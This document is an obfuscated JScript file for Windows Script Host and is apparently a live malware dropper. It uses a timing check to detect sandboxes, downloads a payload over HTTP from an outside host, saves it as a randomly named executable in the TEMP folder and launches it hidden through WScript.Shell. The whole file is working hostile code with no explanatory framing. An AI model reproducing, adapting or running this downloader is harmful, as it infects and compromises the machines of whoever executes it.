var B = false;
var Qz = "CreateObject";
var Np = function bD() {return WScript[Qz]("WScript.Shell");}(), T = 11;
var iw = "MSXML2.XMLHTTP";
var NE = 2123213;
var cR = 0;
function K(iw0){Np["Run"](iw0, cR, cR);};
function s(){return "" + iw;};
function N(z0, Jx){cR = cR * 1; return z0 - Jx;};
function Lj(){return Qz;};
/*@cc_on
  @if (@_win32 || @_win64)
    B = true;
  @end
@*/
if (B)
{
var W = "";
function Eh(){return 22;};
var X = 0; var bw = 0;
function Z()
{
var F = new this["Date"]();
var Pd = F["getUTCMilliseconds"]();
WScript["Sleep"](Eh());
var F = new this["Date"]();
var x = F["getUTCMilliseconds"]();
WScript["Sleep"](Eh());
var F = new this["Date"]();
var b = F["getUTCMilliseconds"]();
var X = "m";
X = N(x, Pd);
var bw = "BQ";
bw = N(b, x);
W = "open";
return N(X, bw);
}
var Y = false;
var oB = false;
for (var wS = cR; wS < Eh() * 1; wS++){if (Z() != cR){
Y = true; 
bw = "31" + 11 * X + bw; 
oB = true; 
break;
}}
function z() {return ((Y == true) && (Y == oB)) ? 1 : cR;};
if (Y && z() && oB){
function Px() {return Np["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Bp6nmgkMDFbsNSSO.exe";};
 ZS = s();
 b0 = WScript[Qz](ZS);
 var Rp = 1;
 while (Rp){
try {
b0[W]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
b0["send"]();
uW = "Sleep";
for (;;){WScript[uW](Eh() * 11); if (b0["readystate"] >= 2 * 2) break;};
Rp = cR;
} catch(x0){};
}
function Gf(ZN) {var M = (1, 2, 3, 4, 5, ZN); return M;};
j = WScript[Lj()]("ADODB.Stream");
ZS = j;
ZS[W]();
ZS["type"] = Gf(1);
ZS["write"](b0["ResponseBody"]);
j["position"] = Gf(cR);
ZS["Save" + "ToFile"](Px(), 2);
j["c"+"lose"]();
P = Px();
K(P);
}
}

